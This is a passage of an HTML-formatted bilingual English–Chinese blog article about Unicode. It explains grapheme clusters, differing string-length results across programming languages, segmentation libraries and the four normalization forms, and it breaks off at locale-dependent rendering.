&lt;li&gt;&lt;code&gt;y̖̠͍̘͇͗̏̽̎͞&lt;/code&gt; is &lt;code&gt;U+0079&lt;/code&gt; + &lt;code&gt;U+0316&lt;/code&gt; + &lt;code&gt;U+0320&lt;/code&gt; + &lt;code&gt;U+034D&lt;/code&gt; + &lt;code&gt;U+0318&lt;/code&gt; + &lt;code&gt;U+0347&lt;/code&gt; + &lt;code&gt;U+0357&lt;/code&gt; + &lt;code&gt;U+030F&lt;/code&gt; + &lt;code&gt;U+033D&lt;/code&gt; + &lt;code&gt;U+030E&lt;/code&gt; + &lt;code&gt;U+035E&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;y̖̠͍̘͇͗̏̽̎͞&lt;/code&gt; 是 &lt;code&gt;U+0079&lt;/code&gt; + &lt;code&gt;U+0316&lt;/code&gt; + &lt;code&gt;U+0320&lt;/code&gt; + &lt;code&gt;U+034D&lt;/code&gt; + &lt;code&gt;U+0318&lt;/code&gt; + &lt;code&gt;U+0347&lt;/code&gt; + &lt;code&gt;U+0357&lt;/code&gt; + &lt;code&gt;U+030F&lt;/code&gt; + &lt;code&gt;U+033D&lt;/code&gt; + &lt;code&gt;U+030E&lt;/code&gt; + &lt;code&gt;U+035E&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;There’s no limit, as far as I know.&lt;/p&gt;
&lt;p&gt;据我所知，没有限制。&lt;/p&gt;
&lt;p&gt;Remember, we are talking about code points here. Even in the widest encoding, UTF-32, &amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;👨‍🏭&amp;lt;/code&amp;gt; will still take three 4-byte units to encode. And it still needs to be treated as a single character.&lt;/p&gt;
&lt;p&gt;记住，我们在这里谈论的是码位。即使在最宽的编码 UTF-32 中，&amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;👨‍🏭&amp;lt;/code&amp;gt; 仍然需要三个 4 字节单元来编码。它仍然需要被视为一个单独的字符。&lt;/p&gt;
&lt;p&gt;If the analogy helps, we can think of the Unicode itself (without any encodings) as being variable-length.&lt;/p&gt;
&lt;p&gt;如果这个类比有帮助的话，我们可以认为 Unicode 本身（没有任何编码）是变长的。&lt;/p&gt;
&lt;p&gt;&amp;lt;Loud
en={&lt;code&gt;An Extended Grapheme Cluster is a sequence of one or more Unicode code points that must be treated as a single, unbreakable character.&lt;/code&gt;}&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一个扩展字位簇是一个或多个 Unicode 码位的序列，必须被视为一个单独的、不可分割的字符。&amp;lt;/Loud&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Therefore, we get all the problems we have with variable-length encodings, but now on code point level: you can’t take only a part of the sequence, it always should be selected, copied, edited, or deleted as a whole.&lt;/p&gt;
&lt;p&gt;因此，我们会遇到所有变长编码的问题，但现在是在码位级别上：你不能只取序列的一部分——它总是应该作为一个整体被选择、复制、编辑或删除。&lt;/p&gt;
&lt;p&gt;Failure to respect grapheme clusters leads to bugs like this:&lt;/p&gt;
&lt;p&gt;不尊重字位簇会导致像这样的错误：&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;https://tonsky.me/blog/unicode/error1.png&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;or this:&lt;/p&gt;
&lt;p&gt;或者这样：&lt;/p&gt;
&lt;p&gt;&amp;lt;figure&amp;gt;
&amp;lt;video autoplay muted loop controls width=&amp;quot;600&amp;quot; height=&amp;quot;201&amp;quot;&amp;gt;
&amp;lt;source src=&amp;quot;https://tonsky.me/blog/unicode/intellij@2x.mp4&amp;quot; type=&amp;quot;video/mp4&amp;quot; /&amp;gt;
&amp;lt;/video&amp;gt;
&amp;lt;figcaption lang=&amp;quot;en&amp;quot;&amp;gt;Just to be clear: this is NOT correct behavior&amp;lt;/figcaption&amp;gt;
&amp;lt;figcaption lang=&amp;quot;zh&amp;quot;&amp;gt;让我们先说清楚：这&amp;lt;em&amp;gt;不是&amp;lt;/em&amp;gt;正确的行为&amp;lt;/figcaption&amp;gt;
&amp;lt;/figure&amp;gt;&lt;/p&gt;
&lt;p&gt;Using UTF-32 instead of UTF-8 will not make your life any easier in regards to extended grapheme clusters. And extended grapheme clusters is what you should care about.&lt;/p&gt;
&lt;p&gt;就扩展字位簇而言，用 UTF-32 代替 UTF-8 不会让你的生活变得更容易。而扩展字位簇才是你应该关心的。&lt;/p&gt;
&lt;p&gt;&amp;lt;Loud en=&amp;quot;Code points — 🥱. Graphemes — 😍&amp;quot;&amp;gt;码位 — 🥱. 字位 — 😍&amp;lt;/Loud&amp;gt;&lt;/p&gt;
&lt;h2&gt;Is Unicode hard only because of emojis?&lt;/h2&gt;
&lt;h2&gt;Unicode 之所以难，仅仅是因为表情符号吗？&lt;/h2&gt;
&lt;p&gt;Not really. Extended Grapheme Clusters are also used for alive, actively used languages. For example:&lt;/p&gt;
&lt;p&gt;并不。没有消亡的、活跃使用的语言也使用扩展字位簇。例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ö&lt;/code&gt; (German) is a single character, but multiple code points (&lt;code&gt;U+006F U+0308&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ö&lt;/code&gt; (德语) 是一个单独的字符，但是多个码位（&lt;code&gt;U+006F U+0308&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ą́&lt;/code&gt; (Lithuanian) is &lt;code&gt;U+00E1 U+0328&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ą́&lt;/code&gt; (立陶宛语) 是 &lt;code&gt;U+00E1 U+0328&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;각&lt;/code&gt; (Korean) is &lt;code&gt;U+1100 U+1161 U+11A8&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&amp;lt;code lang=&amp;quot;ko&amp;quot;&amp;gt;각&amp;lt;/code&amp;gt; (韩语) 是 &lt;code&gt;U+1100 U+1161 U+11A8&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So no, it’s not just about emojis.&lt;/p&gt;
&lt;p&gt;所以，不，这不仅仅是关于表情符号。&lt;/p&gt;
&lt;h2&gt;What’s &lt;code&gt;&amp;quot;🤦🏼‍♂️&amp;quot;.length&lt;/code&gt;?&lt;/h2&gt;
&lt;h2&gt;&lt;code&gt;&amp;quot;🤦🏼‍♂️&amp;quot;.length&lt;/code&gt; 是什么？&lt;/h2&gt;
&lt;p&gt;The question is inspired by &lt;a href=&quot;https://hsivonen.fi/string-length/&quot;&gt;this brilliant article&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;这个问题的灵感来自于&lt;a href=&quot;https://hsivonen.fi/string-length/&quot;&gt;这篇精彩的文章&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;Different programming languages will happily give you different answers.&lt;/p&gt;
&lt;p&gt;不同的编程语言很乐意给你不同的答案。&lt;/p&gt;
&lt;p&gt;&amp;lt;p lang=&amp;quot;mul&amp;quot;&amp;gt;Python 3:&amp;lt;/p&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;Code
lang=&amp;quot;py&amp;quot;
code=&apos;&amp;gt;&amp;gt;&amp;gt; len(&amp;quot;🤦🏼‍♂️&amp;quot;)
5&apos;
/&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;p lang=&amp;quot;mul&amp;quot;&amp;gt;JavaScript / Java / C#:&amp;lt;/p&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;Code
lang=&amp;quot;csharp&amp;quot;
code={&lt;code&gt;&amp;gt;&amp;gt; &amp;quot;🤦🏼‍♂️&amp;quot;.length 7&lt;/code&gt;}
/&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;p lang=&amp;quot;mul&amp;quot;&amp;gt;Rust:&amp;lt;/p&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;Code
lang=&amp;quot;rust&amp;quot;
code={&lt;code&gt;println!(&amp;quot;{}&amp;quot;, &amp;quot;🤦🏼‍♂️&amp;quot;.len()); // =&amp;gt; 17&lt;/code&gt;}
/&amp;gt;&lt;/p&gt;
&lt;p&gt;As you can guess, different languages use different internal string representations (UTF-32, UTF-16, UTF-8) and report length in whatever units they store characters in (ints, shorts, bytes).&lt;/p&gt;
&lt;p&gt;如你所料，不同的语言使用不同的内部字符串表示（UTF-32、UTF-16、UTF-8），并以它们存储字符的任何单位报告长度（int、short、byte）。&lt;/p&gt;
&lt;p&gt;BUT! If you ask any normal person, one that isn’t burdened with computer internals, they’ll give you a straight answer: 1. The length of &amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;🤦🏼‍♂️&amp;lt;/code&amp;gt; string is 1.&lt;/p&gt;
&lt;p&gt;&amp;lt;b&amp;gt;但是！&amp;lt;/b&amp;gt;如果你问任何正常的人，一个不被计算机内部所拖累的人，他们会给你一个直接的答案：1。&amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;🤦🏼‍♂️&amp;lt;/code&amp;gt; 字符串的长度是 1。&lt;/p&gt;
&lt;p&gt;That’s what extended grapheme clusters are all about: what &lt;em&gt;humans&lt;/em&gt; perceive as a single character. And in this case, &amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;🤦🏼‍♂️&amp;lt;/code&amp;gt; is undoubtedly a single character.&lt;/p&gt;
&lt;p&gt;这就是扩展字位簇存在的意义：人们认为是单个字符。在这种情况下，&amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;🤦🏼‍♂️&amp;lt;/code&amp;gt; 无疑是一个单独的字符。&lt;/p&gt;
&lt;p&gt;The fact that &amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;🤦🏼‍♂️&amp;lt;/code&amp;gt; consists of 5 code points (&lt;code&gt;U+1F926 U+1F3FB U+200D U+2642 U+FE0F&lt;/code&gt;) is mere implementation detail. It should not be broken apart, it should not be counted as multiple characters, the text cursor should not be positioned inside it, it shouldn’t be partially selected, etc.&lt;/p&gt;
&lt;p&gt;&amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;🤦🏼‍♂️&amp;lt;/code&amp;gt; 包含 5 个码位（&lt;code&gt;U+1F926 U+1F3FB U+200D U+2642 U+FE0F&lt;/code&gt;）的事实只是实现细节。它不应该被分开，它不应该被计算为多个字符，文本光标不应该被定位在它的内部，它不应该被部分选择，等等。&lt;/p&gt;
&lt;p&gt;For all intents and purposes, this is an atomic unit of text. Internally, it could be encoded whatever, but for user-facing API, it should be treated as a whole.&lt;/p&gt;
&lt;p&gt;实际上，这是一个文本的原子单位。在内部，它可以被编码为任何东西，但对于面向用户的 API，它应该被视为一个整体。&lt;/p&gt;
&lt;p&gt;The only modern language that gets it right is Swift:&lt;/p&gt;
&lt;p&gt;唯一没弄错这件事的现代语言是 Swift：&lt;/p&gt;
&lt;p&gt;&amp;lt;Code lang=&amp;quot;swift&amp;quot; code=&apos;print(&amp;quot;🤦🏼‍♂️&amp;quot;.count)
// =&amp;gt; 1&apos; /&amp;gt;&lt;/p&gt;
&lt;p&gt;Basically, there are two layers:&lt;/p&gt;
&lt;p&gt;基本上，有两层：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Internal, computer-oriented. How to copy strings, send them over the network, store on disk, etc. This is where you need encodings like UTF-8. Swift uses UTF-8 internally, but it might as well be UTF-16 or UTF-32. What&apos;s important is that you only use it to copy strings as a whole and never to analyze their content.&lt;/li&gt;
&lt;li&gt;内部，面向计算机的一层。如何复制字符串、通过网络发送字符串、存储在磁盘上等。这就是你需要 UTF-8 这样的编码的地方。Swift 在内部使用 UTF-8，但也可以是 UTF-16 或 UTF-32。重要的是，你只使用它来整体复制字符串，而不是分析它们的内容。&lt;/li&gt;
&lt;li&gt;External, human-facing API. Character count in UI. Taking first 10 characters to generate preview. Searching in text. Methods like &lt;code&gt;.count&lt;/code&gt; or &lt;code&gt;.substring&lt;/code&gt;. Swift gives you &lt;em&gt;a view&lt;/em&gt; that pretends the string is a sequence of grapheme clusters. And that view behaves like any human would expect: it gives you 1 for &lt;code&gt;&amp;quot;🤦🏼‍♂️&amp;quot;.count&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;外部，面向人类的 API 一层。UI 中的字数统计。获取前 10 个字符以生成预览。在文本中搜索。像 &lt;code&gt;.count&lt;/code&gt; 或 &lt;code&gt;.substring&lt;/code&gt; 这样的方法。Swift 给你&amp;lt;em&amp;gt;一个视图&amp;lt;/em&amp;gt;，假装字符串是一个字位簇序列。这个视图的行为就像任何人所期望的那样：它为 &lt;code&gt;&amp;quot;🤦🏼‍♂️&amp;quot;.count&lt;/code&gt; 给出 1。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I hope more languages adopt this design soon.&lt;/p&gt;
&lt;p&gt;我希望更多的语言尽快采用这种设计。&lt;/p&gt;
&lt;p&gt;Question to the reader: what to you think &lt;code&gt;&amp;quot;ẇ͓̞͒͟͡ǫ̠̠̉̏͠͡ͅr̬̺͚̍͛̔͒͢d̠͎̗̳͇͆̋̊͂͐&amp;quot;.length&lt;/code&gt; should be?&lt;/p&gt;
&lt;p&gt;给读者的问题：你认为 &lt;code&gt;&amp;quot;ẇ͓̞͒͟͡ǫ̠̠̉̏͠͡ͅr̬̺͚̍͛̔͒͢d̠͎̗̳͇͆̋̊͂͐&amp;quot;.length&lt;/code&gt; 应该是什么？&lt;/p&gt;
&lt;h2&gt;How do I detect extended grapheme clusters then?&lt;/h2&gt;
&lt;h2&gt;如何检测扩展字位簇？&lt;/h2&gt;
&lt;p&gt;Unfortunately, most languages choose the easy way out and let you iterate through strings with 1-2-4-byte chunks, but not with grapheme clusters.&lt;/p&gt;
&lt;p&gt;不幸的是，大多数语言都选择了简单的方法，让你通过 1-2-4 字节块迭代字符串，而不是通过字位簇。&lt;/p&gt;
&lt;p&gt;It makes no sense and has no semantics, but since it’s the default, programmers don’t think twice, and we see corrupted strings as the result:&lt;/p&gt;
&lt;p&gt;这没有意义，也不合语义，但由于它是缺省值，程序员不会再考虑，我们看到的结果是损坏的字符串：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/unicode/stdlib@2x.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;“I know, I’ll use a library to do strlen()!” — nobody, ever.&lt;/p&gt;
&lt;p&gt;「我知道，我会使用一个库来做 strlen()！」——从来没有人这样想。&lt;/p&gt;
&lt;p&gt;But that’s exactly what you should be doing! Use a proper Unicode library! Yes, for basic stuff like &lt;code&gt;strlen&lt;/code&gt; or &lt;code&gt;indexOf&lt;/code&gt; or &lt;code&gt;substring&lt;/code&gt;!&lt;/p&gt;
&lt;p&gt;但这正是你应该做的！使用一个合适的 Unicode 库！是的，对于像 &lt;code&gt;strlen&lt;/code&gt; 或 &lt;code&gt;indexOf&lt;/code&gt; 或 &lt;code&gt;substring&lt;/code&gt; 这样的基本功能！&lt;/p&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;C/C++/Java: use &lt;a href=&quot;https://github.com/unicode-org/icu&quot;&gt;ICU&lt;/a&gt;. It’s a library from Unicode itself that encodes all the rules about text segmentation.&lt;/li&gt;
&lt;li&gt;C/C++/Java: 使用 &lt;a href=&quot;https://github.com/unicode-org/icu&quot;&gt;ICU&lt;/a&gt;。它是一个来自 Unicode 自身的库，它对文本分割的所有规则进行编码。&lt;/li&gt;
&lt;li&gt;C#: use &amp;lt;code style=&amp;quot;color: #E81A1A;&amp;quot;&amp;gt;TextElementEnumerator&amp;lt;/code&amp;gt;, which is kept up to date with Unicode as far as I can tell.&lt;/li&gt;
&lt;li&gt;C#: 使用 &amp;lt;code style=&amp;quot;color: #E81A1A;&amp;quot;&amp;gt;TextElementEnumerator&amp;lt;/code&amp;gt;，据我所知，它与 Unicode 保持最新。&lt;/li&gt;
&lt;li&gt;Swift: just stdlib. Swift does the right thing by default.&lt;/li&gt;
&lt;li&gt;Swift: 标准库就行。Swift 默认就做得很好。&lt;/li&gt;
&lt;li&gt;UPD: Erlang/Elixir seem to be doing the right thing, too.&lt;/li&gt;
&lt;li&gt;UPD：Erlang/Elixir 似乎也做得很好。&lt;/li&gt;
&lt;li&gt;For other languages, there’s probably a library or binding for ICU.&lt;/li&gt;
&lt;li&gt;对于其他语言，可能有一个 ICU 的库或绑定。&lt;/li&gt;
&lt;li&gt;Roll your own. Unicode &lt;a href=&quot;https://www.unicode.org/reports/tr29/#Grapheme_Cluster_Boundaries&quot;&gt;publishes&lt;/a&gt; rules and tables in a machine-readable format, and all the libraries above are based on them.&lt;/li&gt;
&lt;li&gt;自己动手。Unicode &lt;a href=&quot;https://www.unicode.org/reports/tr29/#Grapheme_Cluster_Boundaries&quot;&gt;发布&lt;/a&gt;了机器可读的规则和表格，上面的所有库都是基于它们的。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;But whatever you choose, make sure it’s on the recent enough version of Unicode (15.1 at the moment of writing), because the definition of graphemes changes from version to version. For example, Java’s &lt;code&gt;java.text.BreakIterator&lt;/code&gt; is a no-go: it’s based on a very old version of Unicode and not updated.&lt;/p&gt;
&lt;p&gt;不过无论你选哪个，都要确保它是最近的 Unicode 版本（目前是 15.1），因为字位簇的定义会随着版本的变化而变化。例如，Java 的 &lt;code&gt;java.text.BreakIterator&lt;/code&gt; 是不行的：它是基于一个非常旧的 Unicode 版本，而且没有更新。&lt;/p&gt;
&lt;p&gt;&amp;lt;Loud en=&amp;quot;Use a library&amp;quot;&amp;gt;用个库&amp;lt;/Loud&amp;gt;&lt;/p&gt;
&lt;p&gt;IMO, the whole situation is a shame. Unicode should be in the stdlib of every language by default. It’s the lingua franca of the internet! It’s not even new: we’ve been living with Unicode for 20 years now.&lt;/p&gt;
&lt;p&gt;我觉得，整个情况都令人遗憾。Unicode 应该是每种语言的标准库。这是互联网的通用语言！它甚至不是什么新鲜玩意&amp;lt;small&amp;gt;儿&amp;lt;/small&amp;gt;：我们已经与 Unicode 生活了 20 年了。&lt;/p&gt;
&lt;h2&gt;Wait, rules are changing?&lt;/h2&gt;
&lt;h2&gt;等下，规则一直变化？&lt;/h2&gt;
&lt;p&gt;Yes! Ain’t it cool?&lt;/p&gt;
&lt;p&gt;是的！很酷吧？&lt;/p&gt;
&lt;p&gt;(I know, it ain’t)&lt;/p&gt;
&lt;p&gt;（我知道，这并不）&lt;/p&gt;
&lt;p&gt;Starting roughly in 2014, Unicode has been releasing a major revision of their standard every year. This is where you get your new emojis from — Android and iOS updates in the Fall usually include the newest Unicode standard among other things.&lt;/p&gt;
&lt;p&gt;大概从 2014 年开始，Unicode 每年都会发布一次主要修订版。这就是你获得新的 emoji 的地方——Android 和 iOS 的更新通常包括最新的 Unicode 标准。&lt;/p&gt;
&lt;p&gt;&amp;lt;Img src=&amp;quot;https://tonsky.me/blog/unicode/versions@2x.png&amp;quot; width=&amp;quot;300&amp;quot; height=&amp;quot;620&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;What’s sad for us is that the rules defining grapheme clusters change every year as well. What is considered a sequence of two or three separate code points today might become a grapheme cluster tomorrow! There’s no way to know! Or prepare!&lt;/p&gt;
&lt;p&gt;对我们来说可悲的是定义字位簇的规则也在每年变化。今天被认为是两个或三个单独码位的序列，明天可能就成为字位簇！我们无从得知，没法准备！&lt;/p&gt;
&lt;p&gt;Even worse, different versions of your own app might be running on different Unicode standards and report different string lengths!&lt;/p&gt;
&lt;p&gt;更糟糕的是，你自己的应用程序的不同版本可能在不同的 Unicode 标准上运行，并给出不同的字符串长度！&lt;/p&gt;
&lt;p&gt;But that’s the reality we live in. You don’t really have a choice here. You can’t ignore Unicode or Unicode updates if you want to stay relevant and provide a decent user experience. So, buckle up, embrace, and update.&lt;/p&gt;
&lt;p&gt;但这就是我们所生活的现实——你实际上别无选择。如果你想站稳脚跟并提供良好的用户体验，就不能忽略 Unicode 或 Unicode 更新。所以，寄好安全带，拥抱更新。&lt;/p&gt;
&lt;p&gt;&amp;lt;Loud en=&amp;quot;Update yearly&amp;quot;&amp;gt;每年更新&amp;lt;/Loud&amp;gt;&lt;/p&gt;
&lt;h2&gt;Why is &amp;quot;Å&amp;quot; !== &amp;quot;Å&amp;quot; !== &amp;quot;Å&amp;quot;?&lt;/h2&gt;
&lt;h2&gt;为什么 &lt;code&gt;&amp;quot;Å&amp;quot; !== &amp;quot;Å&amp;quot; !== &amp;quot;Å&amp;quot;&lt;/code&gt;？&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/unicode/spider_men@2x.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Copy any of these to your JavaScript console:&lt;/p&gt;
&lt;p&gt;请将下面任何一行复制到你的 JavaScript 控制台：&lt;/p&gt;
&lt;p&gt;&amp;lt;Code
code={&lt;code&gt;&amp;quot;Å&amp;quot; === &amp;quot;Å&amp;quot;; &amp;quot;Å&amp;quot; === &amp;quot;Å&amp;quot;; &amp;quot;Å&amp;quot; === &amp;quot;Å&amp;quot;;&lt;/code&gt;}
lang=&amp;quot;javascript&amp;quot;
/&amp;gt;&lt;/p&gt;
&lt;p&gt;What do you get? False? You should get false, and it’s not a mistake.&lt;/p&gt;
&lt;p&gt;你得到了什么？False？确实是 &amp;lt;samp&amp;gt;false&amp;lt;/samp&amp;gt;，并且这不是一个错误。&lt;/p&gt;
&lt;p&gt;Remember earlier when I said that &lt;code&gt;ö&lt;/code&gt; is two code points, &lt;code&gt;U+006F U+0308&lt;/code&gt;? Basically, Unicode offers more than one way to write characters like &lt;code&gt;ö&lt;/code&gt; or &lt;code&gt;Å&lt;/code&gt;. You can:&lt;/p&gt;
&lt;p&gt;还记得我之前说过 &lt;code&gt;ö&lt;/code&gt; 是两个码位，&lt;code&gt;U+006F U+0308&lt;/code&gt; 吗？基本上，Unicode 提供了多种写法，比如 &lt;code&gt;ö&lt;/code&gt; 或 &lt;code&gt;Å&lt;/code&gt;。你可以：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Compose &lt;code&gt;Å&lt;/code&gt; from normal Latin &lt;code&gt;A&lt;/code&gt; + a combining character,&lt;/li&gt;
&lt;li&gt;从普通拉丁字母 &lt;code&gt;A&lt;/code&gt; + 一个连接字符组合出 &lt;code&gt;Å&lt;/code&gt;，&lt;/li&gt;
&lt;li&gt;OR there’s also a pre-composed code point &lt;code&gt;U+00C5&lt;/code&gt; that does that for you.&lt;/li&gt;
&lt;li&gt;&amp;lt;em&amp;gt;或者&amp;lt;/em&amp;gt;还有一个预组合的码位 &lt;code&gt;U+00C5&lt;/code&gt; 帮你做了这件事。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;They will look the same (&lt;code&gt;Å&lt;/code&gt; vs &lt;code&gt;Å&lt;/code&gt;), they should work the same, and for all intents and purposes, they are considered exactly the same. The only difference is the byte representation.&lt;/p&gt;
&lt;p&gt;他们将会看起来一样（&lt;code&gt;Å&lt;/code&gt; vs &lt;code&gt;Å&lt;/code&gt;），它们应该用起来一样，并且它们实际上在方方面面都被视为完全一样。唯一的区别是字节表示。&lt;/p&gt;
&lt;p&gt;That’s why we need normalization. There are four forms:&lt;/p&gt;
&lt;p&gt;这就是我们需要归一化的原因。有四种形式：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NFD&lt;/strong&gt; tries to explode everything to the smallest possible pieces, and also sorts pieces in a canonical order if there is more than one.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NFD&lt;/strong&gt; 尝试将所有东西都分解为最小的可能部分，并且如果有多个部分，则按照规范顺序对部分进行排序。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NFC&lt;/strong&gt;, on the other hand, tries to combine everything into pre-composed form if one exists.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NFC&lt;/strong&gt;，另一方面，尝试将所有东西组合成存在的预组合形式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/unicode/normalization@2x.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;For some characters there are also multiple versions of them in Unicode. For example, there’s &lt;code&gt;U+00C5 Latin Capital Letter A with Ring Above&lt;/code&gt;, but there’s also &lt;code&gt;U+212B Angstrom Sign&lt;/code&gt; which looks the same.&lt;/p&gt;
&lt;p&gt;对于某些字符，它们在 Unicode 中也有多个版本。例如，有 &lt;code&gt;U+00C5 Latin Capital Letter A with Ring Above&lt;/code&gt;，但也有 &lt;code&gt;U+212B Angstrom Sign&lt;/code&gt;，它看起来是一样的。&lt;/p&gt;
&lt;p&gt;These are also replaced during normalization:&lt;/p&gt;
&lt;p&gt;这些也在归一化过程中被替换掉了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/unicode/normalization_clones@2x.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;NFD and NFC are called “canonical normalization”. Another two forms are “compatibility normalization”:&lt;/p&gt;
&lt;p&gt;NFD 和 NFC 被称为「规范归一化」。另外两种形式是「兼容归一化」：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NFKD&lt;/strong&gt; tries to explode everything and replaces visual variants with default ones.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NFKD&lt;/strong&gt; 尝试将所有东西分解开来，并用默认的替换视觉变体。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NFKC&lt;/strong&gt; tries to combine everything while replacing visual variants with default ones.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NFKC&lt;/strong&gt; 尝试将所有东西组合起来，同时用默认的替换视觉变体。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/unicode/normalization_compat@2x.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Visual variants are separate Unicode code points that represent the same character but are supposed to render differently. Like, &lt;code&gt;①&lt;/code&gt; or &lt;code&gt;⁹&lt;/code&gt; or &lt;code&gt;𝕏&lt;/code&gt;. We want to be able to find both &lt;code&gt;&amp;quot;x&amp;quot;&lt;/code&gt; and &lt;code&gt;&amp;quot;2&amp;quot;&lt;/code&gt; in a string like &lt;code&gt;&amp;quot;𝕏²&amp;quot;&lt;/code&gt;, don’t we?&lt;/p&gt;
&lt;p&gt;&amp;lt;dfn&amp;gt;视觉变体&amp;lt;/dfn&amp;gt;是表示相同字符的单独的 Unicode 码位，但是应该呈现不同。比如 &lt;code&gt;①&lt;/code&gt; 或 &lt;code&gt;⁹&lt;/code&gt; 或 &lt;code&gt;𝕏&lt;/code&gt;。我们想要在像 &lt;code&gt;&amp;quot;𝕏²&amp;quot;&lt;/code&gt; 这样的字符串中找到 &lt;code&gt;&amp;quot;x&amp;quot;&lt;/code&gt; 和 &lt;code&gt;&amp;quot;2&amp;quot;&lt;/code&gt;，不是吗？&lt;/p&gt;
&lt;p&gt;&amp;lt;Img src=&amp;quot;https://tonsky.me/blog/unicode/x_variants@2x.png&amp;quot;
width=&amp;quot;438&amp;quot; height=&amp;quot;185&amp;quot;
zhcap=&amp;quot;所有这些字符都有它们自己的码位，但它们也都是 X&amp;quot;
encap=&amp;quot;All of these have their own code points, but they are also all Xs&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;Why does the &lt;code&gt;ﬁ&lt;/code&gt; ligature even have its own code point? No idea. A lot can happen in a million characters.&lt;/p&gt;
&lt;p&gt;为什么连 &lt;code&gt;ﬁ&lt;/code&gt; 这个连字都有它自己的码位？不知道。在一百万个字符中，很多事情都可能发生。&lt;/p&gt;
&lt;p&gt;&amp;lt;Loud en=&amp;quot;Before comparing strings or searching for a substring, normalize!&amp;quot;&amp;gt;在比较字符串或搜索子字符串之前，归一化！&amp;lt;/Loud&amp;gt;&lt;/p&gt;
&lt;h2&gt;Unicode is locale-dependent&lt;/h2&gt;
&lt;h2&gt;Unicode 是基于{区域设置}^(locale)的&lt;/h2&gt;
&lt;p&gt;The Russian name Nikolay is written like this:&lt;/p&gt;
&lt;p&gt;俄语名字 Nikolay 的写法如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/unicode/nikolay_ru.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;and encoded in Unicode as &lt;code&gt;U+041D 0438 043A 043E 043B 0430 0439&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;并且在 Unicode 中编码为 &lt;code&gt;U+041D 0438 043A 043E 043B 0430 0439&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;The Bulgarian name Nikolay is written:&lt;/p&gt;
&lt;p&gt;保加利亚语名字 Nikolay 的写法如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/unicode/nikolay_bg.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;and encoded in Unicode as &lt;code&gt;U+041D 0438 043A 043E 043B 0430 0439&lt;/code&gt;. Exactly the same!&lt;/p&gt;
&lt;p&gt;并且在 Unicode 中编码为 &lt;code&gt;U+041D 0438 043A 043E 043B 0430 0439&lt;/code&gt;。完全一样！&lt;/p&gt;
&lt;p&gt;Wait a second! How does the computer know when to render Bulgarian-style glyphs and when to use Russian ones?&lt;/p&gt;
&lt;p&gt;等一下！计算机如何知道何时呈现保加利亚式字形，何时使用俄语字形？&lt;/p&gt;
